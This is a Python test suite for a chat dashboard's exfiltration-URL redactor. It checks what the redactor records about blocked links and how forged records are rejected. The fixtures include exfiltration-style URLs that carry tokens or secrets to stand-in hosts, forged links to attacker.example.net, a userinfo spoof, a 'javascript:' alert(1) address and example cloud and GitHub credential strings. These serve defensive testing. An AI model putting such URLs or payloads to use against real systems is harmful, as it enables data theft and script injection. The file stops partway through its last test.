"""Backend contract for the blocked-link chip's structure-only records.

The exfiltration redactor keeps only the domain in the saved transcript, so a
chip built from that text can show nothing but the site name. Step 3 adds a
one-loop collector that emits, per redacted URL, a JSON-serialisable record
retaining STRUCTURE only -- domain, rule id, a path kept only when both removers
would pass it, and the query's char COUNT -- never the query value. These tests
pin the record shape, the retention rule, the dedupe, the persistence attach
point, and the attacker-writable-meta carve-out.
"""

from __future__ import annotations

import json
import re

import pytest

from kiro_crew.dashboard import chat_persistence
from kiro_crew.dashboard.chat_utils import (
    _prepare_messages,
    _redact_meta_for_role,
    adopt_variant_text,
    variant_from_row,
)
from kiro_crew.security import (
    bounded_blocked_links,
    exfil,
    hard_credential_hit,
    redact_credentials,
    redact_exfiltration_urls,
    redact_exfiltration_urls_with_records,
    scan_exfiltration_urls,
)
from kiro_crew.security.exfil import _exfil_url_warning, revalidate_blocked_link

_DOMAIN = "collect.example.com"
_LONG_QUERY_TAIL = "A" * 250
# A host label the credential remover rewrites, which is what these cases need,
# and deliberately NOT an access-key id, an ARN or an account id: the scope lane's
# candidate corpus travels as a public artifact and refuses a credential shape it
# cannot attribute to a field, so a fixture spelled like a cloud key costs that
# lane its run without making the test any stronger.
_SECRET_LABEL = "ghp_" + "k7qmz2x9wv4tb8ncr6yd3fj5hs1gpl0aeuo2"


def _placeholder_count(text: str) -> int:
    from kiro_crew.security import EXFILTRATION_REDACTION_TAG_PREFIX

    return text.count(EXFILTRATION_REDACTION_TAG_PREFIX)


class TestCollectorRecordsMatchRedaction:
    def test_one_record_per_redacted_url_in_order(self) -> None:
        url_a = f"https://a.example.com/x?token={_LONG_QUERY_TAIL}"
        url_b = f"https://b.example.com/y?token={_LONG_QUERY_TAIL}"
        text = f"first {url_a} then {url_b}"

        cleaned, warnings, records = redact_exfiltration_urls_with_records(text)

        assert warnings
        assert _placeholder_count(cleaned) == 2
        assert [r["domain"] for r in records] == ["a.example.com", "b.example.com"]

    def test_repeated_url_yields_one_record(self) -> None:
        url = f"https://{_DOMAIN}/x?token={_LONG_QUERY_TAIL}"
        text = f"{url} and again {url}"

        cleaned, _, records = redact_exfiltration_urls_with_records(text)

        # Every occurrence is redacted, but the record set is deduped by the
        # matched URL string in first-appearance order.
        assert _placeholder_count(cleaned) == 2
        assert len(records) == 1

    def test_records_carry_no_positional_field(self) -> None:
        url = f"https://{_DOMAIN}/x?token={_LONG_QUERY_TAIL}"

        _, _, records = redact_exfiltration_urls_with_records(f"see {url}")

        assert records
        for record in records:
            assert set(record.keys()) == {
                "domain",
                "rule",
                "path",
                "query_chars",
                "url",
                "url_withheld",
            }


class TestPathRetention:
    def test_clean_path_is_kept(self) -> None:
        url = f"https://{_DOMAIN}/reports/summary?token={_LONG_QUERY_TAIL}"

        _, _, records = redact_exfiltration_urls_with_records(f"see {url}")

        assert records[0]["path"] == "/reports/summary"

    def test_path_that_itself_trips_the_rule_is_not_kept(self) -> None:
        # Heavy percent encoding in the PATH trips the redactor on the path
        # alone -- retention check 1 fails -- so nothing is kept.
        percent_path = "/" + "%41" * 25
        url = f"https://{_DOMAIN}{percent_path}"
        assert _exfil_url_warning(_DOMAIN, percent_path, frozenset()) is not None

        _, warnings, records = redact_exfiltration_urls_with_records(f"see {url}")

        assert warnings
        assert records[0]["path"] is None

    def test_path_carrying_a_credential_is_not_kept(self) -> None:
        # A bare secret run the query heuristics never see (they scan only the
        # query) passes the URL warning on the path alone but is stripped by
        # credential redaction -- retention check 2 is what drops it.
        secret = "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"
        cred_path = f"/d/{secret}"
        assert _exfil_url_warning(_DOMAIN, cred_path, frozenset()) is None
        assert redact_credentials(cred_path)[0] != cred_path

        url = f"https://{_DOMAIN}{cred_path}?token={_LONG_QUERY_TAIL}"
        _, _, records = redact_exfiltration_urls_with_records(f"see {url}")

        assert records[0]["path"] is None


class TestTheFullAddressIsKeptSoItCanBeOpened:
    def test_a_link_without_a_credential_keeps_its_whole_address(self) -> None:
        # The common false positive: an ordinary long query that trips the
        # length rule. The reader needs it back, so it is kept verbatim.
        query = f"leak=S3cr3tExfilPayloadValueThatMustNeverPersist0001{_LONG_QUERY_TAIL}"
        url = f"https://{_DOMAIN}/p?{query}"

        cleaned, _, records = redact_exfiltration_urls_with_records(f"see {url}")

        assert records[0]["query_chars"] == len(query)
        assert records[0]["url"] == url
        assert records[0]["url_withheld"] is None
        # The address lives in the record only; the text keeps the placeholder.
        assert url not in cleaned

    def test_a_cjk_title_link_keeps_its_whole_address(self) -> None:
        title = "%E6%B5%8B%E8%AF%95%E9%A1%B5%E9%9D%A2%E6%A0%87%E9%A2%98%E6%96%87"
        url = f"https://wiki.example.com/view/{title}"

        _, warnings, records = redact_exfiltration_urls_with_records(f"see {url}")

        assert warnings
        assert records[0]["url"] == url

    def test_a_link_carrying_a_credential_is_withheld(self) -> None:
        url = f"https://{_DOMAIN}/dump/AKIAIOSFODNN7EXAMPLE"

        _, warnings, records = redact_exfiltration_urls_with_records(f"see {url}")

        assert warnings
        assert records[0]["query_chars"] == 0
        assert records[0]["url"] is None
        assert records[0]["url_withheld"] == "credential"
        assert "AKIAIOSFODNN7EXAMPLE" not in json.dumps(records)

    def test_a_partially_encoded_credential_is_withheld(self) -> None:
        # Unchanged by the remover as literal text; a browser decodes %5F back
        # into the underscore that makes it a GitHub token.
        token_tail = "A" * 36
        url = f"https://{_DOMAIN}/x/ghp%5F{token_tail}?q={_LONG_QUERY_TAIL}"
        assert redact_credentials(url)[0] == url

        _, _, records = redact_exfiltration_urls_with_records(f"see {url}")

        assert records[0]["url"] is None
        assert records[0]["url_withheld"] == "credential"
        assert records[0]["path"] is None

    def test_an_address_past_the_bound_is_withheld_not_truncated(self) -> None:
        url = f"https://{_DOMAIN}/p?q=" + "a" * exfil.MAX_BLOCKED_LINK_URL_CHARS

        _, _, records = redact_exfiltration_urls_with_records(f"see {url}")

        assert records[0]["url"] is None
        assert records[0]["url_withheld"] == "length"

    def test_a_forged_address_on_another_host_is_dropped(self) -> None:
        forged = {
            "domain": _DOMAIN,
            "rule": "exfil_query_length",
            "path": None,
            "query_chars": 3,
            "url": "https://attacker.example.net/?q=abc",
            "url_withheld": None,
        }
        assert revalidate_blocked_link(forged) is None

    def test_a_forged_non_http_address_is_dropped(self) -> None:
        forged = {
            "domain": _DOMAIN,
            "rule": "exfil_query_length",
            "path": None,
            "query_chars": 3,
            "url": f"javascript://{_DOMAIN}/%0Aalert(1)",
            "url_withheld": None,
        }
        assert revalidate_blocked_link(forged) is None

    def test_a_forged_address_with_userinfo_is_dropped(self) -> None:
        forged = {
            "domain": _DOMAIN,
            "rule": "exfil_query_length",
            "path": None,
            "query_chars": 3,
            "url": f"https://{_DOMAIN}@attacker.example.net/",
            "url_withheld": None,
        }
        assert revalidate_blocked_link(forged) is None

    def test_a_record_with_both_or_neither_half_is_dropped(self) -> None:
        base = {"domain": _DOMAIN, "rule": "exfil_query_length", "path": None, "query_chars": 3}
        both = {**base, "url": f"https://{_DOMAIN}/?q=abc", "url_withheld": "length"}
        neither = {**base, "url": None, "url_withheld": None}
        unknown = {**base, "url": None, "url_withheld": "because"}
        assert revalidate_blocked_link(both) is None
        assert revalidate_blocked_link(neither) is None
        assert revalidate_blocked_link(unknown) is None

    def test_a_kept_address_survives_the_read_back(self) -> None:
        url = f"https://{_DOMAIN}/p?q={_LONG_QUERY_TAIL}"
        _, _, records = redact_exfiltration_urls_with_records(f"see {url}")

        assert bounded_blocked_links(records) == records

    def test_a_forged_credential_address_is_dropped_on_read_back(self) -> None:
        # A transcript line is attacker-writable: a credential written straight
        # into the url field is re-checked on serve, never trusted.
        forged = {
            "domain": _DOMAIN,
            "rule": "exfil_query_length",
            "path": None,
            "query_chars": 0,
            "url": f"https://{_DOMAIN}/dump/AKIAIOSFODNN7EXAMPLE",
            "url_withheld": None,
        }
        assert revalidate_blocked_link(forged) is None


class TestQueryIsCounted:
    def test_query_chars_zero_when_absent(self) -> None:
        url = f"https://{_DOMAIN}/dump/AKIAIOSFODNN7EXAMPLE"

        _, warnings, records = redact_exfiltration_urls_with_records(f"see {url}")

        assert warnings
        assert records[0]["query_chars"] == 0


class TestExistingCallersUnaffected:
    def test_clean_text_returns_unchanged_two_tuple(self) -> None:
        text = "nothing suspicious https://example.com/docs here"

        result = redact_exfiltration_urls(text)

        assert result == (text, [])

    def test_blocked_url_two_tuple_matches_collector(self) -> None:
        from kiro_crew.security import EXFILTRATION_REDACTION_TAG_PREFIX

        url = f"https://{_DOMAIN}/x?token={_LONG_QUERY_TAIL}"
        text = f"see {url}"

        cleaned, warnings = redact_exfiltration_urls(text)
        cleaned2, warnings2, _ = redact_exfiltration_urls_with_records(text)

        assert (cleaned, warnings) == (cleaned2, warnings2)
        assert f"{EXFILTRATION_REDACTION_TAG_PREFIX}{_DOMAIN}]" in cleaned


class TestPersistenceAttachesRecords:
    def test_a_row_keeps_the_records_it_arrives_with(self) -> None:
        # The shape the live path produces: the text is ALREADY the placeholder,
        # because the redaction that made it is where the records were born.
        url = f"https://{_DOMAIN}/reports/summary?token={_LONG_QUERY_TAIL}"
        redacted, _, records = redact_exfiltration_urls_with_records(f"see {url}")
        entry = chat_persistence._build_message_entry_uncached(
            {
                "role": "assistant",
                "content": redacted,
                "ts": "2026-01-01T00:00:00Z",
                "meta": {"blocked_links": records},
            }
        )

        assert entry is not None
        blocked = entry["meta"]["blocked_links"]
        assert blocked[0]["domain"] == _DOMAIN
        assert blocked[0]["path"] == "/reports/summary"
        assert url not in entry["content"]

    def test_persistence_does_not_invent_records_from_a_placeholder(self) -> None:
        # A scan of this row can only see the placeholder, so re-deriving here
        # would describe nothing. The absence is the point: records are carried,
        # never re-derived, and a row that arrives without them stays without.
        url = f"https://{_DOMAIN}/reports/summary?token={_LONG_QUERY_TAIL}"
        redacted, _, _ = redact_exfiltration_urls_with_records(f"see {url}")
        entry = chat_persistence._build_message_entry_uncached(
            {"role": "assistant", "content": redacted, "ts": "2026-01-01T00:00:00Z"}
        )

        assert entry is not None
        assert "blocked_links" not in (entry.get("meta") or {})

    def test_clean_message_omits_the_key(self) -> None:
        entry = chat_persistence._build_message_entry_uncached(
            {"role": "assistant", "content": "no links here", "ts": "2026-01-01T00:00:00Z"}
        )

        assert entry is not None
        assert "meta" not in entry

    def test_user_branch_is_not_redacted(self) -> None:
        url = f"https://{_DOMAIN}/x?token={_LONG_QUERY_TAIL}"
        entry = chat_persistence._build_message_entry_uncached(
            {"role": "user", "content": f"see {url}", "ts": "2026-01-01T00:00:00Z"}
        )

        assert entry is not None
        assert entry["content"] == f"see {url}"
        assert "meta" not in entry


class TestRetentionIsBounded:
    """The store is the transcript line, so both retention points carry a bound.

    A record is cheap to write into a line, and every render of the message that
    holds it re-validates and re-serializes whatever it holds.
    """

    def test_the_record_count_is_capped_but_the_text_is_fully_redacted(self) -> None:
        cap = exfil.MAX_BLOCKED_LINKS_PER_MESSAGE
        urls = [f"https://h{i}.example.com/x?token={_LONG_QUERY_TAIL}" for i in range(cap + 5)]
        text = " ".join(urls)

        cleaned, _, records = redact_exfiltration_urls_with_records(text)

        assert len(records) == cap
        # The cap bounds what is DESCRIBED, never what is removed.
        for url in urls:
            assert url not in cleaned
        assert _placeholder_count(cleaned) == cap + 5

    def test_an_overlong_path_is_dropped_not_truncated(self) -> None:
        long_path = "/" + "a" * (exfil.MAX_BLOCKED_LINK_PATH_CHARS + 1)
        url = f"https://{_DOMAIN}{long_path}?token={_LONG_QUERY_TAIL}"

        _, _, records = redact_exfiltration_urls_with_records(url)

        assert len(records) == 1
        assert records[0]["path"] is None
        assert records[0]["domain"] == _DOMAIN

    def test_revalidation_rejects_an_absurd_query_count(self) -> None:
        record = {
            "domain": _DOMAIN,
            "rule": "long_query",
            "path": None,
            "query_chars": exfil.MAX_BLOCKED_LINK_QUERY_CHARS + 1,
            "url": None,
            "url_withheld": "length",
        }

        assert revalidate_blocked_link(record) is None

    def test_revalidation_rejects_an_overlong_path(self) -> None:
        record = {
            "domain": _DOMAIN,
            "rule": "long_query",
            "path": "/" + "a" * (exfil.MAX_BLOCKED_LINK_PATH_CHARS + 1),
            "query_chars": 256,
            "url": None,
            "url_withheld": "length",
        }

        assert revalidate_blocked_link(record) is None

    def test_a_forged_line_carrying_many_valid_records_is_capped(self) -> None:
        cap = exfil.MAX_BLOCKED_LINKS_PER_MESSAGE
        forged = [
            {
                "domain": f"h{i}.example.com",
                "rule": "long_query",
                "path": None,
                "query_chars": 256,
                "url": None,
                "url_withheld": "length",
            }
            for i in range(cap * 4)
        ]

        out = _redact_meta_for_role("assistant", {"blocked_links": forged})

        assert len(out["blocked_links"]) == cap

    def test_every_retained_string_has_a_bound(self) -> None:
        # The validator reads this table rather than each field by name, so a
        # field added without an entry is not retained. Pinning the table against
        # the record's own key set is what makes that hold for a FUTURE field.
        bounded = set(exfil._BLOCKED_LINK_STRING_BOUNDS)
        assert bounded == exfil._BLOCKED_LINK_RECORD_KEYS - {"query_chars"}
        assert all(limit > 0 for limit in exfil._BLOCKED_LINK_STRING_BOUNDS.values())

    def test_revalidation_rejects_an_overlong_domain_and_rule(self) -> None:
        over_domain = "a" * 300 + ".example.com"
        assert (
            revalidate_blocked_link(
                {
                    "domain": over_domain,
                    "rule": "long_query",
                    "path": None,
                    "query_chars": 1,
                    "url": None,
                    "url_withheld": "length",
                }
            )
            is None
        )
        assert (
            revalidate_blocked_link(
                {
                    "domain": _DOMAIN,
                    "rule": "r" * 200,
                    "path": None,
                    "query_chars": 1,
                    "url": None,
                    "url_withheld": "length",
                }
            )
            is None
        )

    def test_the_dedupe_set_stops_growing_at_the_cap(self) -> None:
        cap = exfil.MAX_BLOCKED_LINKS_PER_MESSAGE
        urls = [f"https://h{i}.example.com/x?token={_LONG_QUERY_TAIL}" for i in range(cap + 6)]
        # Each URL twice, so a dedupe row past the cap would be reachable twice.
        text = " ".join(urls + urls)

        cleaned, _, records = redact_exfiltration_urls_with_records(text)

        assert len(records) == cap
        for url in urls:
            assert url not in cleaned


class TestRecordsReachTheDisplayPath:
    """The display path reads the ROW's meta, so the records have to be on it.

    `_prepare_messages` hands `m["meta"]` to `_redact_meta_for_role`, and
    `slot.append` broadcasts the live frame from inside the call, so the records
    go into the meta that call carries rather than onto the row afterwards.
    """

    def test_segment_meta_carries_the_records(self, monkeypatch) -> None:
        from kiro_crew.dashboard import chat_runner

        monkeypatch.setattr(chat_runner, "_decisions_strip_meta", lambda _slot: None)
        records = [
            {
                "domain": _DOMAIN,
                "rule": "exfil_query_length",
                "path": "/p",
                "query_chars": 9,
                "url": None,
                "url_withheld": "length",
            }
        ]

        assert chat_runner._segment_row_meta(object(), records) == {"blocked_links": records}

    def test_segment_meta_is_none_when_there_is_nothing_to_carry(self, monkeypatch) -> None:
        from kiro_crew.dashboard import chat_runner

        monkeypatch.setattr(chat_runner, "_decisions_strip_meta", lambda _slot: None)

        assert chat_runner._segment_row_meta(object(), []) is None

    def test_segment_meta_keeps_the_decision_strip_beside_them(self, monkeypatch) -> None:
        from kiro_crew.dashboard import chat_runner

        monkeypatch.setattr(
            chat_runner, "_decisions_strip_meta", lambda _slot: {"decisions_strip": ["x"]}
        )
        records = [
            {
                "domain": _DOMAIN,
                "rule": "exfil_query_length",
                "path": None,
                "query_chars": 9,
                "url": None,
                "url_withheld": "length",
            }
        ]

        out = chat_runner._segment_row_meta(object(), records)

        assert out == {"decisions_strip": ["x"], "blocked_links": records}

    def test_the_segment_flush_collects_records_at_its_own_redaction(self) -> None:
        # A source guard, because the wiring is the defect: a flush that calls the
        # two-tuple redactor stores the placeholder and the chip never renders,
        # and no unit on the persistence layer can see that.
        import inspect

        from kiro_crew.dashboard import chat_runner

        src = inspect.getsource(chat_runner._flush_segment)
        assert "_redact_segment(slot, assistant_text)" in src
        assert "_segment_row_meta(slot, blocked_links, redactions)" in src
        helper = inspect.getsource(chat_runner._redact_segment_text)
        assert "redact_exfiltration_urls_with_records(" in helper
        assert "redact_credentials_with_records(" in helper

    def test_an_interrupted_reply_collects_records_at_its_own_redaction(self) -> None:
        # Same guard for the recovery path: a stopped or failed turn persists its
        # partial text through this nested helper, and a two-tuple redactor there
        # would store only the placeholder, losing a wrongly blocked link for good.
        import inspect

        from kiro_crew.dashboard import chat_runner

        lines = inspect.getsource(chat_runner).splitlines()
        start = next(i for i, ln in enumerate(lines) if "def _persist_partial_reply(" in ln)
        indent = len(lines[start]) - len(lines[start].lstrip())
        body = []
        for ln in lines[start + 1 :]:
            if ln.strip() and len(ln) - len(ln.lstrip()) <= indent:
                break
            body.append(ln)
        src = "\n".join(body)
        assert "_redact_segment(slot, body)" in src
        assert "_segment_row_meta(slot, _blocked, _redactions)" in src
        assert "redact_exfiltration_urls(body)" not in src


class TestRecordsSurviveAReopenedSession:
    """A row's records travel with it: born at the redaction, carried thereafter.

    The load path redacts content on the way in, so a rehydrated row holds the
    placeholder. Content survives a reopen because redaction is idempotent;
    records are not derivable from it at all, which is why they are carried.
    """

    def test_carried_records_survive_a_reserialisation(self) -> None:
        url = f"https://{_DOMAIN}/reports/summary?token={_LONG_QUERY_TAIL}"
        redacted, _, saved = redact_exfiltration_urls_with_records(f"see {url}")

        rehydrated = chat_persistence._build_message_entry_uncached(
            {
                "role": "assistant",
                "content": redacted,
                "ts": "2026-01-01T00:00:00Z",
                "meta": {"blocked_links": saved},
            }
        )

        assert rehydrated is not None
        assert rehydrated["meta"]["blocked_links"] == saved

    def test_carried_records_are_dropped_without_a_placeholder(self) -> None:
        # Records DESCRIBE placeholders, so a row whose text has none does not
        # keep them -- that pairing is the only thing making them meaningful.
        entry = chat_persistence._build_message_entry_uncached(
            {
                "role": "assistant",
                "content": "no links here",
                "ts": "2026-01-01T00:00:00Z",
                "meta": {
                    "blocked_links": [
                        {
                            "domain": _DOMAIN,
                            "rule": "exfil_query_length",
                            "path": "/reports/summary",
                            "query_chars": 256,
                            "url": None,
                            "url_withheld": "length",
                        }
                    ]
                },
            }
        )

        assert entry is not None
        assert "blocked_links" not in (entry.get("meta") or {})

    def test_a_carried_record_is_still_revalidated(self) -> None:
        url = f"https://{_DOMAIN}/reports/summary?token={_LONG_QUERY_TAIL}"
        redacted, _, saved = redact_exfiltration_urls_with_records(f"see {url}")

        entry = chat_persistence._build_message_entry_uncached(
            {
                "role": "assistant",
                "content": redacted,
                "ts": "2026-01-01T00:00:00Z",
                "meta": {
                    "blocked_links": [
                        {
                            "domain": "not a host",
                            "rule": "exfil_query_length",
                            "path": None,
                            "query_chars": 1,
                            "url": None,
                            "url_withheld": "length",
                        },
                        saved[0],
                    ]
                },
            }
        )

        assert entry is not None
        assert entry["meta"]["blocked_links"] == [saved[0]]


class TestTheDedupeSetIsBoundedByTheRecordsItServes:
    """`seen` holds whole URLs, and only the record cap beside it bounds them.

    So every rejection has to happen before it grows: a dedupe row for a match
    that produces no record is state nothing bounds.
    """

    def test_rejected_urls_do_not_grow_the_dedupe_set(self) -> None:
        secret = _SECRET_LABEL
        # Each URL is unique AND rejected: a credential-shaped host, so no record
        # is retained and the cap never rises to bound the dedupe rows.
        urls = [
            f"https://{secret}.h{i}.example.com/p?token={_LONG_QUERY_TAIL}"
            for i in range(exfil.MAX_BLOCKED_LINKS_PER_MESSAGE * 3)
        ]
        text = " ".join(urls)

        cleaned, _, records = redact_exfiltration_urls_with_records(text)

        assert records == []
        # The removal never depends on any of this.
        for url in urls:
            assert url not in cleaned

    def test_a_host_the_reload_would_drop_is_never_retained(self) -> None:
        # Over the domain bound: retained at collection and dropped on read-back
        # makes the explanation vanish under the reader after a reload.
        label = "a" * 260
        url = f"https://{label}.example.com/p?token={_LONG_QUERY_TAIL}"

        cleaned, _, records = redact_exfiltration_urls_with_records(f"see {url}")

        assert url not in cleaned
        for record in records:
            assert revalidate_blocked_link(record) == record

    def test_every_collected_record_survives_its_own_read_back(self) -> None:
        # The property the two paths must share, stated once: anything collection
        # keeps, the read-back keeps.
        text = " ".join(
            f"https://h{i}.example.com/reports/summary?token={_LONG_QUERY_TAIL}" for i in range(5)
        )

        _, _, records = redact_exfiltration_urls_with_records(text)

        assert records
        assert bounded_blocked_links(records) == records


class TestARetainedHostObeysTheRemovers:
    """The host answers to the rule the retained path already answers to.

    A retained string is kept only when both removers pass it unchanged. A DNS
    label can be shaped like a credential, and a record carrying one would walk
    that secret past the text redaction into meta and onto the chip.
    """

    def test_a_credential_shaped_host_is_not_retained_at_collection(self) -> None:
        secret = _SECRET_LABEL
        url = f"https://{secret}.collect.example.com/p?token={_LONG_QUERY_TAIL}"

        cleaned, _, records = redact_exfiltration_urls_with_records(f"see {url}")

        # The URL still goes, which is the part that must never depend on this.
        assert url not in cleaned
        assert all(secret not in r["domain"] for r in records)

    def test_a_forged_credential_host_is_dropped_on_read_back(self) -> None:
        record = {
            "domain": f"{_SECRET_LABEL}.collect.example.com",
            "rule": "exfil_query_length",
            "path": None,
            "query_chars": 9,
            "url": None,
            "url_withheld": "length",
        }

        assert revalidate_blocked_link(record) is None
        assert bounded_blocked_links([record]) == []

    def test_an_underscored_host_is_retained_like_any_other(self) -> None:
        # The DNS branch admits `_`, which internal and SRV names carry. Pinned
        # here because the render side mirrors THIS gate: a shape the backend
        # keeps and the renderer drops costs the reader the explanation for a
        # placeholder that is still sitting in the text.
        record = {
            "domain": "my_service.example.com",
            "rule": "exfil_query_length",
            "path": None,
            "query_chars": 9,
            "url": None,
            "url_withheld": "length",
        }

        assert revalidate_blocked_link(record) == record

    def test_an_ordinary_host_still_passes(self) -> None:
        record = {
            "domain": _DOMAIN,
            "rule": "exfil_query_length",
            "path": None,
            "query_chars": 9,
            "url": None,
            "url_withheld": "length",
        }

        assert revalidate_blocked_link(record) == record


class TestNoRuleIdIsEverInvented:
    """An id nobody can look up is worse than no record at all."""

    def test_a_bracketed_ipv6_host_is_what_the_placeholder_carries(self) -> None:
        # Pins what the renderer has to parse: the placeholder and the record
        # carry the host exactly as the URL spelled it, brackets included.
        url = f"https://[2001:db8::1]/reports?token={_LONG_QUERY_TAIL}"

        cleaned, _, records = redact_exfiltration_urls_with_records(f"see {url}")

        assert url not in cleaned
        if records:
            assert records[0]["domain"] == "[2001:db8::1]"
            assert "[2001:db8::1]" in cleaned

    def test_collection_emits_only_ids_the_tracer_produces(self) -> None:
        url = f"https://{_DOMAIN}/reports?token={_LONG_QUERY_TAIL}"

        _, _, records = redact_exfiltration_urls_with_records(f"see {url}")

        assert records
        for record in records:
            assert record["rule"] != "exfil_unknown"
            assert record["rule"].startswith("exfil_")

    def test_the_sentinel_id_appears_nowhere_in_the_collector(self) -> None:
        import inspect

        src = inspect.getsource(exfil.redact_exfiltration_urls_with_records)

        assert "exfil_unknown" not in src


class TestOneBoundedConstructor:
    """Every list of records read back off a line comes from one function.

    Each retained field's length is already a property of the record shape; the
    COUNT is a property of this constructor, so a site that reads records cannot
    retain an unbounded number of them by forgetting to slice.
    """

    @staticmethod
    def _records(count: int) -> list[dict]:
        return [
            {
                "domain": f"h{i}.example.com",
                "rule": "exfil_query_length",
                "path": "/p",
                "query_chars": 9,
                "url": None,
                "url_withheld": "length",
            }
            for i in range(count)
        ]

    def test_a_forged_line_cannot_retain_more_than_the_cap(self) -> None:
        over = exfil.MAX_BLOCKED_LINKS_PER_MESSAGE + 8

        kept = bounded_blocked_links(self._records(over))

        assert len(kept) == exfil.MAX_BLOCKED_LINKS_PER_MESSAGE

    def test_the_truncated_tail_is_counted_and_said(self, caplog) -> None:
        # A silently dropped tail reads like a message that never had those links.
        caplog.set_level("WARNING", logger=exfil.logger.name)

        bounded_blocked_links(self._records(exfil.MAX_BLOCKED_LINKS_PER_MESSAGE + 8))

        said = [r.getMessage() for r in caplog.records if "exceed the cap" in r.getMessage()]
        assert len(said) == 1
        assert "8 further record(s)" in said[0]

    def test_a_list_within_the_cap_says_nothing(self, caplog) -> None:
        caplog.set_level("WARNING", logger=exfil.logger.name)

        bounded_blocked_links(self._records(exfil.MAX_BLOCKED_LINKS_PER_MESSAGE))

        assert not [r for r in caplog.records if "exceed the cap" in r.getMessage()]

    def test_it_drops_only_the_records_that_fail(self) -> None:
        raw = [
            {
                "domain": "not a host",
                "rule": "exfil_query_length",
                "path": None,
                "query_chars": 1,
                "url": None,
                "url_withheld": "length",
            }
        ]
        raw.extend(self._records(2))

        kept = bounded_blocked_links(raw)

        assert len(kept) == 2

    def test_anything_that_is_not_a_list_yields_nothing(self) -> None:
        for raw in ({"domain": "a.example.com"}, "records", 7, None):
            assert bounded_blocked_links(raw) == []

    def test_both_retention_points_ask_this_one_function(self) -> None:
        # A source guard: a site that slices and revalidates by hand is a site
        # that can be written without the slice, which is how a new read path
        # escapes the cap.
        import inspect

        from kiro_crew.dashboard import chat_persistence, chat_utils

        for mod in (
            chat_utils._redact_meta_for_role,
            chat_persistence._build_message_entry_uncached,
        ):
            src = inspect.getsource(mod)
            assert "revalidate_blocked_link(" not in src


class TestAVariantCarriesItsOwnRecords:
    """A record describes ONE text, so a variant switch moves both or neither.

    Variants are alternate replies the reader can switch back to. Text and
    records travel as one value through ``adopt_variant_text``, so a row cannot
    end up explaining a link that is absent from the text on screen.
    """

    @staticmethod
    def _record(domain: str) -> dict:
        return {
            "domain": domain,
            "rule": "exfil_query_length",
            "path": "/reports/summary",
            "query_chars": 256,
            "url": None,
            "url_withheld": "length",
        }

    def test_switching_takes_the_variant_s_records_with_its_text(self) -> None:
        row = {
            "role": "assistant",
            "content": "old text",
            "ts": "t0",
            "meta": {"blocked_links": [self._record("old.example.com")]},
        }

        adopt_variant_text(
            row,
            {"content": "new text", "ts": "t1", "blocked_links": [self._record("new.example.com")]},
        )

        assert row["content"] == "new text"
        assert row["ts"] == "t1"
        assert row["meta"]["blocked_links"] == [self._record("new.example.com")]

    def test_switching_to_a_clean_variant_drops_the_stale_records(self) -> None:
        # The alternative is a chip explaining a host this text never held.
        row = {
            "role": "assistant",
            "content": "old text",
            "ts": "t0",
            "meta": {"blocked_links": [self._record("old.example.com")]},
        }

        adopt_variant_text(row, {"content": "nothing blocked here", "ts": "t1"})

        assert "meta" not in row

    def test_other_meta_survives_the_switch(self) -> None:
        row = {
            "role": "assistant",
            "content": "old",
            "ts": "t0",
            "meta": {"mid": "m1", "blocked_links": [self._record("old.example.com")]},
        }

        adopt_variant_text(row, {"content": "new", "ts": "t1"})

        assert row["meta"] == {"mid": "m1"}

    def test_a_variant_gains_records_on_a_row_that_had_none(self) -> None:
        row = {"role": "assistant", "content": "clean", "ts": "t0"}

        adopt_variant_text(
            row,
            {"content": "blocked", "ts": "t1", "blocked_links": [self._record("new.example.com")]},
        )

        assert row["meta"]["blocked_links"] == [self._record("new.example.com")]

    def test_both_variant_directions_bound_the_records_at_retention(self) -> None:
        # The variant list outlives the render that would otherwise bound it, so
        # each move applies the one bounded constructor: count capped, forged
        # records dropped, in both directions.
        from kiro_crew.dashboard.chat_utils import variant_from_row

        cap = exfil.MAX_BLOCKED_LINKS_PER_MESSAGE
        many = [self._record(f"h{i}.example.com") for i in range(cap + 8)]
        forged = {**self._record("x.example.com"), "domain": "a" * 400}

        stashed = variant_from_row(
            {"content": "c", "ts": "t", "meta": {"blocked_links": many + [forged]}}
        )
        assert len(stashed["blocked_links"]) == cap

        row = {"role": "assistant", "content": "old", "ts": "t0"}
        adopt_variant_text(row, {"content": "new", "ts": "t1", "blocked_links": many})
        assert len(row["meta"]["blocked_links"]) == cap

        row = {"role": "assistant", "content": "old", "ts": "t0"}
        adopt_variant_text(row, {"content": "new", "ts": "t1", "blocked_links": [forged]})
        assert "meta" not in row

    def test_a_regenerate_stash_takes_the_records_with_the_text(self) -> None:
        # The round trip that loses them silently: the stashed text is already a
        # placeholder, so a stash without the records leaves nothing any later
        # scan can rebuild -- switching back would hand the reader a bare
        # placeholder with no way to learn what was removed.
        row = {
            "role": "assistant",
            "content": "see [REDACTED: suspicious URL to old.example.com]",
            "ts": "t0",
            "meta": {"blocked_links": [self._record("old.example.com")]},
        }

        stashed = variant_from_row(row)

        assert stashed["blocked_links"] == [self._record("old.example.com")]
        assert stashed["content"] == row["content"]

    def test_a_clean_row_stashes_without_inventing_records(self) -> None:
        stashed = variant_from_row({"role": "assistant", "content": "nothing here", "ts": "t0"})

        assert "blocked_links" not in stashed

    def test_the_round_trip_returns_the_same_records(self) -> None:
        original = {
            "role": "assistant",
            "content": "see [REDACTED: suspicious URL to old.example.com]",
            "ts": "t0",
            "meta": {"blocked_links": [self._record("old.example.com")]},
        }
        stashed = variant_from_row(original)

        # A regenerate replaced the row; the reader switches back to the stash.
        row: dict = {"role": "assistant", "content": "a different reply", "ts": "t1"}
        adopt_variant_text(row, stashed)

        assert row["content"] == original["content"]
        assert row["meta"]["blocked_links"] == [self._record("old.example.com")]

    def test_the_stash_site_moves_the_pair_through_one_function(self) -> None:
        import inspect

        from kiro_crew.dashboard import chat_regenerate

        src = inspect.getsource(chat_regenerate.api_chat_slot_regenerate)
        assert "variant_from_row(ai_msg)" in src
        assert '"content": ai_msg.get("content"' not in src

    def test_the_stash_flush_carries_records_instead_of_rescanning(self) -> None:
        # A rescan here reads already-redacted text, so it can only ever return
        # nothing; a source guard keeps the records variant out of this site.
        import inspect

        from kiro_crew.dashboard import chat_runner

        src = inspect.getsource(chat_runner._flush_segment)
        stash = src[src.index("_pending_variants") :]
        assert "redact_exfiltration_urls_with_records(v" not in stash

    def test_the_switch_endpoint_moves_the_pair_through_one_function(self) -> None:
        # A source guard: a site that assigns content directly is a site that can
        # leave the records behind, and no unit on this row can see that.
        import inspect

        from kiro_crew.dashboard import chat_regenerate

        src = inspect.getsource(chat_regenerate.api_chat_slot_switch_variant)
